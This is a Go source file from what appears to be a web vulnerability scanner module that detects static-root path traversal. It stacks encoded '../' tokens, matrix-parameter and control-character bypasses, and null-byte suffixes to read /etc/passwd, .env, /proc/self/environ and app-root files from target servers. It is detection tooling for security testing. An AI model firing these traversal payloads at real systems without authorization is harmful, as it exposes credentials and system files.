package path_normalization

import (
	"fmt"
	"strings"

	"github.com/pkg/errors"
	urlutil "github.com/projectdiscovery/utils/url"

	"github.com/vigolium/vigolium/pkg/core/hosterrors"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"github.com/vigolium/vigolium/pkg/modules/infra"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/output"
	"github.com/vigolium/vigolium/pkg/types/severity"
	"github.com/vigolium/vigolium/pkg/utils"
)

// Static-root path traversal.
//
// This is a second, file-read-oriented oracle layered onto path_normalization,
// distinct from the status/fingerprint oracle in scanner.go. It targets the
// class of bug where a static-file handler matches a request against its mount
// loosely (the router / a fronting proxy still routes `/static;/..%2f...` to the
// `/static` handler) while the downstream file resolver (Node `send` /
// `serve-static` and similar "match loosely, resolve strictly" splits) decodes
// `%2f`, resolves the `..`, and escapes the static root — fooling its own
// `path.startsWith(root)` boundary check.
//
// The status oracle below never fires for this: over-traversal on `send` clamps
// at filesystem `/` and still returns 200 with the file, so there is no
// 400->2xx transition. The only reliable signal is the file's *contents* (or a
// directory / bucket listing) appearing in the body, which is what this branch
// confirms.
//
// Unlike the rest of path_normalization (and the other path modules) this branch
// intentionally runs on media/JS asset URLs — those *are* the static-handler
// requests — so it does NOT use infra.IsValidForInjectionVulns, which would
// reject exactly the URLs that exercise the bug.

const (
	// staticTraversalDepth is how many encoded "../" tokens we stack onto a
	// shell. A container's static dir can sit several levels below the app root
	// (and OS root), so we climb a handful of levels.
	staticTraversalDepth = 6
	// staticMinBodyLen avoids matching tiny stub/empty bodies as file reads or
	// listings.
	staticMinBodyLen = 30
	// staticMaxResponseStore caps how much of a leaked body we keep in the
	// finding evidence.
	staticMaxResponseStore = 4096
	// staticProbeBudget hard-caps the total probe requests across both tiers per
	// (host, mount) so the Tier-2 cross-product cannot blow up on a host that
	// shows smoke but never confirms.
	staticProbeBudget = 500
	// staticDecoyFile is a filename that cannot exist on the target. Reaching the
	// same markers through the same shell wrapped around it would prove the
	// markers are not actually introduced by the traversal (a catch-all / SPA
	// that 200s everything), so such a candidate is rejected.
	staticDecoyFile = "vigolium-static-trav-404.nonexist"
)

// markerClass identifies what kind of evidence a target's markers prove.
type markerClass int

const (
	classFileContent   markerClass = iota // markers are file contents (passwd, package.json, .env, ...)
	classDirListing                       // markers are an autoindex / directory listing
	classBucketListing                    // markers are a cloud-bucket (S3/GCS/Azure) object listing
)

// travTarget is a file (or, when path == "", a trailing-slash listing probe)
// whose presence in a response confirms the traversal escaped the static root.
type travTarget struct {
	path       string      // file to read; "" => trailing-slash listing probe
	markers    []string    // substrings expected in a successful read (lowercased when ci)
	minMarkers int         // distinct markers that must be newly present (absent from baseline)
	class      markerClass // what the markers prove
	tier       int         // 1 = always probed; 2 = only after a Tier-1 signal
	weak       bool        // weak/variable content (README): caps confidence at Firm
	ci         bool        // case-insensitive marker match (listings)
	label      string      // human label for finding evidence
}

// staticTargets is the curated target/marker table. File-content markers carry
// real OS files plus the Node app-root files that sit one level above a typical
// static dir (package.json/.env/...), which is the highest-signal confirmation
// for this exact class. Listing targets need no filename — climbing to a parent
// directory and getting an autoindex (or a bucket index) is itself proof.
var staticTargets = []travTarget{
	// --- Class A: file content, Tier 1 ---
	{path: "etc/passwd", markers: []string{"root:", ":0:0:", "/bin/"}, minMarkers: 2, class: classFileContent, tier: 1, label: "/etc/passwd"},
	{path: "package.json", markers: []string{`"name"`, `"version"`, `"dependencies"`}, minMarkers: 2, class: classFileContent, tier: 1, label: "package.json (app root)"},
	{path: ".env", markers: []string{"_KEY=", "_SECRET=", "_TOKEN=", "_HOST=", "PASSWORD=", "API_KEY=", "SECRET=", "DATABASE_URL="}, minMarkers: 2, class: classFileContent, tier: 1, label: ".env (app root)"},
	{path: "proc/self/environ", markers: []string{"PATH=", "HOME="}, minMarkers: 2, class: classFileContent, tier: 1, label: "/proc/self/environ"},

	// --- Class B: directory listing, Tier 1 (cheap, high-value, no filename) ---
	{path: "", markers: []string{"index of /", "<title>index of", "parent directory", "directory listing for"}, minMarkers: 1, class: classDirListing, tier: 1, ci: true, label: "directory listing (autoindex)"},

	// --- Class A: more file content, Tier 2 ---
	{path: "package-lock.json", markers: []string{`"lockfileversion"`, `"packages"`, `"dependencies"`}, minMarkers: 2, class: classFileContent, tier: 2, ci: true, label: "package-lock.json (app root)"},
	{path: "tsconfig.json", markers: []string{`"compileroptions"`}, minMarkers: 1, class: classFileContent, tier: 2, ci: true, label: "tsconfig.json (app root)"},
	// README.md content is highly variable, so its markers are structural
	// markdown and it is flagged weak: it confirms "reached app root" but never
	// escalates to Certain on its own.
	{path: "README.md", markers: []string{"\n# ", "\n## ", "](", "\n```"}, minMarkers: 2, class: classFileContent, tier: 2, weak: true, label: "README.md (app root)"},

	// --- Class C: cloud-bucket listing, Tier 2 ---
	{path: "", markers: []string{"<listbucketresult", "<enumerationresults", "s3.amazonaws.com/doc/2006-03-01", `"kind": "storage#objects"`, "<blobs>"}, minMarkers: 1, class: classBucketListing, tier: 2, ci: true, label: "cloud bucket object listing"},
}

// travShell wraps a mount, an encoded "../" token (repeated depth times) and a
// target into a request path. The matrix-parameter (";") shells are the bypass;
// the plain encoded-slash shell is a control that helps attribute a hit to the
// ";" when both differ.
type travShell struct {
	name  string
	tier  int
	build func(mount, dotdot string, depth int, target string) string
}

var staticShells = []travShell{
	// Tier 1: the canonical matrix-parameter + encoded-slash bypass, plus a
	// plain encoded-slash control.
	{name: "matrix-encoded-slash", tier: 1, build: func(m, d string, n int, t string) string { return m + ";/" + strings.Repeat(d, n) + t }},
	{name: "plain-encoded-slash", tier: 1, build: func(m, d string, n int, t string) string { return m + "/" + strings.Repeat(d, n) + t }},

	// Tier 2: named matrix parameter and control-character boundary breakers
	// (%0a / %0d / %0d%0a / %00 / %23) that defeat a startsWith/regex check that
	// stops at the injected character.
	{name: "matrix-named-param", tier: 2, build: func(m, d string, n int, t string) string { return m + ";a=b/" + strings.Repeat(d, n) + t }},
	{name: "lf-break", tier: 2, build: func(m, d string, n int, t string) string { return m + "%0a;/" + strings.Repeat(d, n) + t }},
	{name: "cr-break", tier: 2, build: func(m, d string, n int, t string) string { return m + "%0d;/" + strings.Repeat(d, n) + t }},
	{name: "crlf-break", tier: 2, build: func(m, d string, n int, t string) string { return m + "%0d%0a;/" + strings.Repeat(d, n) + t }},
	{name: "null-break", tier: 2, build: func(m, d string, n int, t string) string { return m + "%00;/" + strings.Repeat(d, n) + t }},
	{name: "hash-break", tier: 2, build: func(m, d string, n int, t string) string { return m + "%23/" + strings.Repeat(d, n) + t }},
}

// encToken is one encoded "../" with its tier.
type encToken struct {
	tok  string
	tier int
}

var staticTokens = []encToken{
	{tok: "..%2f", tier: 1}, // canonical encoded slash

	{tok: "..%252f", tier: 2},            // double-encoded slash
	{tok: "%2e%2e%2f", tier: 2},          // encoded dots + encoded slash
	{tok: "%2e%2e/", tier: 2},            // encoded dots + literal slash
	{tok: "..%c0%af", tier: 2},           // overlong UTF-8 slash
	{tok: "%c0%ae%c0%ae%c0%af", tier: 2}, // overlong UTF-8 dots + slash
	{tok: "..%e0%80%af", tier: 2},        // 3-byte overlong UTF-8 slash
	{tok: "%uff0e%uff0e%uff0f", tier: 2}, // fullwidth unicode dots + solidus
}

// encSuffix is a control-character truncation appended to a file target (cuts an
// appended extension or fragment-truncates a boundary check). Applied to file
// targets only.
type encSuffix struct {
	suf  string
	tier int
}

var staticSuffixes = []encSuffix{
	{suf: "", tier: 1},
	{suf: "%00", tier: 2},     // null-byte extension truncation
	{suf: "%00.js", tier: 2},  // null byte before an expected .js extension
	{suf: "%00.css", tier: 2}, // null byte before an expected .css extension
	{suf: "%23", tier: 2},     // fragment-truncation boundary breaker
}

// scanStaticRootTraversal runs the static-handler traversal oracle. It returns
// any confirmed finding and a fatal flag (true => host became unresponsive,
// caller should stop). It is gated to static-looking requests and deduped once
// per (host, mount-segment).
func (m *Module) scanStaticRootTraversal(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
	urlx *urlutil.URL,
) ([]*output.ResultEvent, bool) {
	if method := ctx.Request().Method(); method == "OPTIONS" || method == "CONNECT" {
		return nil, false
	}

	segment := firstStaticSegment(urlx.Path)
	if segment == "" {
		return nil, false
	}
	if !looksStatic(urlx, segment, ctx) {
		return nil, false
	}

	// Dedup once per (host, mount-segment): the bug lives at the mount, not at
	// each individual asset under it.
	if ds := m.ds.Get(scanCtx.DedupMgr()); ds != nil && ds.IsSeen(urlx.Hostname()+"|"+segment) {
		return nil, false
	}

	rawHTTP := ctx.Request().Raw()
	if ctx.Request().Method() != "GET" {
		rawHTTP = infra.SwapToGetMethodRequest(rawHTTP)
	}
	mount := "/" + segment
	service := ctx.Service()

	var baselineBody string
	if ctx.Response() != nil {
		baselineBody = ctx.Response().BodyToString()
	}
	// Lowercase the (constant) baseline once for case-insensitive marker matching
	// instead of re-lowering it on every probe inside the sweep.
	bl := baselineRefs{body: baselineBody, lower: strings.ToLower(baselineBody)}

	// Wildcard/soft-404 reference so a host that 200s every path (SPA shell) is
	// not mistaken for a successful traversal.
	wildcard, _ := scanCtx.WildcardProbe(ctx, httpClient)

	budget := staticProbeBudget

	// Tier 1: canonical shape only.
	res, promising, fatal := m.sweepStatic(1, httpClient, service, urlx, rawHTTP, mount, segment, bl, wildcard, &budget)
	if fatal {
		return res, true
	}
	if len(res) > 0 {
		return res, false
	}
	if !promising {
		return nil, false
	}

	// Tier 2: unfurl encodings, control breakers, suffixes and extra targets —
	// only because Tier 1 already showed the shell reaches something distinct.
	res, _, fatal = m.sweepStatic(2, httpClient, service, urlx, rawHTTP, mount, segment, bl, wildcard, &budget)
	return res, fatal
}

// baselineRefs carries the baseline asset body plus its pre-lowercased form so
// case-insensitive marker matching never re-lowers the constant baseline.
type baselineRefs struct {
	body  string
	lower string
}

// sweepStatic runs every shell × token × target × suffix combination whose
// combined tier equals pass, returning the first confirmed finding. promising is
// true when some probe reached a distinct, non-wildcard response (a partial
// marker hit or a 2xx body that differs from the baseline), which gates Tier 2.
func (m *Module) sweepStatic(
	pass int,
	httpClient *http.Requester,
	service *httpmsg.Service,
	urlx *urlutil.URL,
	rawHTTP []byte,
	mount, segment string,
	bl baselineRefs,
	wildcard *modkit.WildcardEntry,
	budget *int,
) ([]*output.ResultEvent, bool, bool) {
	var promising bool

	for depth := 1; depth <= staticTraversalDepth; depth++ {
		for _, sh := range staticShells {
			for _, tk := range staticTokens {
				for _, tgt := range staticTargets {
					for _, sf := range targetSuffixes(tgt) {
						if max(sh.tier, tk.tier, tgt.tier, sf.tier) != pass {
							continue
						}
						if *budget <= 0 {
							return nil, promising, false
						}

						path := sh.build(mount, tk.tok, depth, tgt.path+sf.suf)
						status, body, ok, fatal := fetchStatic(httpClient, service, rawHTTP, path, false, budget)
						if fatal {
							return nil, promising, true
						}
						if !ok || len(body) < staticMinBodyLen || matchesWildcard(wildcard, status, body) {
							continue
						}

						newCount := countNewMarkers(body, bl.body, bl.lower, tgt.markers, tgt.ci)
						if newCount < tgt.minMarkers {
							// A partial marker hit, or a distinct 2xx body, means
							// the shell is reaching *something* off-mount: worth
							// unfurling Tier 2.
							partialHit := newCount > 0
							distinctBody := status >= 200 && status < 300 && !modkit.BodiesSimilar(body, bl.body)
							if partialHit || distinctBody {
								promising = true
							}
							continue
						}

						// The decoy (a bogus filename in the same shell) is only
						// meaningful for file reads; listings have no filename.
						decoyPath := ""
						if tgt.class == classFileContent {
							decoyPath = sh.build(mount, tk.tok, depth, staticDecoyFile)
						}
						if !m.confirmStatic(httpClient, service, rawHTTP, path, decoyPath, tgt, bl, wildcard, budget) {
							promising = true
							continue
						}

						ev := m.buildStaticFinding(urlx, rawHTTP, path, body, segment, sh.name, tgt, newCount)
						if ev != nil {
							return []*output.ResultEvent{ev}, promising, false
						}
					}
				}
			}
		}
	}
	return nil, promising, false
}

// noSuffixes is the single empty-suffix list used for non-file targets (listings
// take no filename suffix). Hoisted so the sweep does not re-allocate it per
// target iteration.
var noSuffixes = []encSuffix{{tier: 1}}

// targetSuffixes returns the suffix variants to try for a target: the full set
// for file reads, none for listing probes.
func targetSuffixes(tgt travTarget) []encSuffix {
	if tgt.class == classFileContent {
		return staticSuffixes
	}
	return noSuffixes
}

// confirmStatic re-fetches the exact candidate path (NoClustering, defeating the
// 500ms response cache) and, when decoyPath is set, sends the same shell around a
// non-existent decoy filename. A genuine read reproduces; a catch-all that
// returns the same markers for a bogus file is rejected. An empty decoyPath skips
// the decoy step (listing probes have no filename).
func (m *Module) confirmStatic(
	httpClient *http.Requester,
	service *httpmsg.Service,
	rawHTTP []byte,
	path, decoyPath string,
	tgt travTarget,
	bl baselineRefs,
	wildcard *modkit.WildcardEntry,
	budget *int,
) bool {
	// Reproduce the read.
	status, body, ok, _ := fetchStatic(httpClient, service, rawHTTP, path, true, budget)
	if !ok {
		return false // cannot confirm -> drop (strict)
	}
	if matchesWildcard(wildcard, status, body) {
		return false
	}
	if countNewMarkers(body, bl.body, bl.lower, tgt.markers, tgt.ci) < tgt.minMarkers {
		return false
	}

	// Decoy negative for file reads: the same shell around a bogus filename must
	// NOT surface the markers.
	if decoyPath != "" {
		dStatus, dBody, dOK, _ := fetchStatic(httpClient, service, rawHTTP, decoyPath, true, budget)
		if dOK && !matchesWildcard(wildcard, dStatus, dBody) &&
			countNewMarkers(dBody, bl.body, bl.lower, tgt.markers, tgt.ci) >= tgt.minMarkers {
			return false
		}
	}
	return true
}

// buildStaticFinding assembles the ResultEvent. A genuine multi-marker file read
// (>=3 markers, non-weak) is Critical/Certain; everything else is High/Firm.
func (m *Module) buildStaticFinding(
	urlx *urlutil.URL,
	rawHTTP []byte,
	path, body, segment, shellName string,
	tgt travTarget,
	markerCount int,
) *output.ResultEvent {
	sev := severity.High
	conf := severity.Firm
	if tgt.class == classFileContent && !tgt.weak && markerCount >= 3 {
		sev = severity.Critical
		conf = severity.Certain
	}

	rawReq, err := httpmsg.SetPath(rawHTTP, path)
	if err != nil {
		return nil
	}
	rawReq, _ = httpmsg.ClearQueryString(rawReq)

	desc := fmt.Sprintf(
		"Static-root path traversal via the %q shell: request path %q escaped the static file handler's root and disclosed %s (%d content markers matched, absent from the baseline asset response). "+
			"A matrix-parameter / encoded-slash request shape keeps the router pointed at the static mount while the file resolver decodes and traverses above the root, defeating its startsWith(root) boundary check.",
		shellName, path, tgt.label, markerCount,
	)

	return &output.ResultEvent{
		ModuleID:         m.ID(),
		URL:              urlx.Scheme + "://" + urlx.Host + path,
		Host:             urlx.Host,
		Matched:          path,
		Request:          string(rawReq),
		Response:         truncateBody(body),
		FuzzingParameter: segment,
		ExtractedResults: []string{path},
		Info: output.Info{
			Name:        "Static Root Path Traversal",
			Description: desc,
			Severity:    sev,
			Confidence:  conf,
			Reference: []string{
				"https://github.com/pillarjs/send",
				"https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf",
			},
		},
	}
}

// fetchStatic issues a single GET to path (the encoded shell is preserved on the
// wire) and returns its status and body. It decrements budget on every call so
// the hard cap covers probes, reproductions and decoy fetches uniformly; once
// budget is exhausted it short-circuits to ok=false. noClustering bypasses the
// requester's response cache for back-to-back confirmation replays. fatal is true
// only when the host is unresponsive.
func fetchStatic(httpClient *http.Requester, service *httpmsg.Service, rawHTTP []byte, path string, noClustering bool, budget *int) (status int, body string, ok bool, fatal bool) {
	if *budget <= 0 {
		return 0, "", false, false
	}
	*budget--

	raw, err := httpmsg.SetPath(rawHTTP, path)
	if err != nil {
		return 0, "", false, false
	}
	raw, _ = httpmsg.ClearQueryString(raw)

	req, err := httpmsg.ParseRawRequest(string(raw))
	if err != nil {
		return 0, "", false, false
	}
	req = req.WithService(service)

	resp, _, err := httpClient.Execute(req, http.Options{NoRedirects: true, NoClustering: noClustering})
	if err != nil {
		if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
			return 0, "", false, true
		}
		return 0, "", false, false
	}
	defer resp.Close()
	if resp.Response() == nil {
		return 0, "", false, false
	}
	// Body().String() copies out of the pooled buffer, so it is safe after Close.
	return resp.Response().StatusCode, resp.Body().String(), true, false
}

// countNewMarkers counts markers present in body but absent from baseline. When
// ci, the body is lowercased and the caller-supplied pre-lowercased baseline is
// used (markers are pre-lowercased in the table); otherwise the match is exact.
func countNewMarkers(body, baseline, baselineLower string, markers []string, ci bool) int {
	b, base := body, baseline
	if ci {
		b = strings.ToLower(body)
		base = baselineLower
	}
	count := 0
	for _, mk := range markers {
		if strings.Contains(b, mk) && !strings.Contains(base, mk) {
			count++
		}
	}
	return count
}

// matchesWildcard reports whether status/body look like the host's wildcard
// shell, guarding the []byte conversion behind IsWildcard so non-wildcard hosts
// (the common case) never pay for it.
func matchesWildcard(wildcard *modkit.WildcardEntry, status int, body string) bool {
	return wildcard.IsWildcard() && wildcard.MatchesBody(status, []byte(body))
}

// looksStatic reports whether this request looks like it hits a static-file
// handler: a known static mount segment, a static-asset extension on the URL, or
// a static-asset baseline content-type.
func looksStatic(urlx *urlutil.URL, segment string, ctx *httpmsg.HttpRequestResponse) bool {
	if staticMountSegments[strings.ToLower(segment)] {
		return true
	}
	if utils.IsMediaAndJSURL(urlx.Path) {
		return true
	}
	if ctx.Response() != nil && modkit.IsStaticAssetContentType(ctx.Response().Header("Content-Type")) {
		return true
	}
	return false
}

// staticMountSegments are first-path-segment names that commonly mount a static
// file handler.
var staticMountSegments = map[string]bool{
	"static": true, "assets": true, "asset": true, "public": true,
	"js": true, "css": true, "img": true, "imgs": true, "image": true, "images": true,
	"media": true, "fonts": true, "font": true, "dist": true, "build": true,
	"files": true, "file": true, "uploads": true, "upload": true, "vendor": true,
	"cdn": true, "scripts": true, "styles": true, "content": true, "resources": true,
	"_next": true, "_nuxt": true, "node_modules": true, "bundles": true, "wp-content": true,
}

// firstStaticSegment returns the first non-empty path segment, e.g. "static" for
// "/static/js/app.js".
func firstStaticSegment(urlPath string) string {
	for _, p := range strings.Split(strings.TrimPrefix(urlPath, "/"), "/") {
		if p = strings.TrimSpace(p); p != "" {
			return p
		}
	}
	return ""
}

func truncateBody(s string) string {
	if len(s) > staticMaxResponseStore {
		return s[:staticMaxResponseStore]
	}
	return s
}
